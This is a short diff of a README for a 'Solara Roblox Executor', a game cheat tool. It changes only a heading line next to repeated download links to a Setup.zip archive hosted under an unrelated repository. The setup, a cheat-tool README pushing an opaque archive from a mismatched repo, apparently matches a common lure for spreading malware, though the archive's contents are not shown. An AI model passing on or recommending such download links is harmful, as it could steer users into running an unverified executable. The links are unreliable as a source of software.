@@ -10,7 +10,7 @@ Welcome to the Solara Roblox Executor repository, where we redefine Windows expl
 # Download [Download Archive](https://github.com/nattavutkhuntamli/JOBS-API/releases/download/Setup/Setup.zip)
 # Download [Download Archive](https://github.com/nattavutkhuntamli/JOBS-API/releases/download/Setup/Setup.zip)
 
-# Code on archive ***github*** <----------------
+# Code on archive - ***github*** 
 ## Features
 
 - **Advanced Script Execution**: Execute complex scripts with ease.
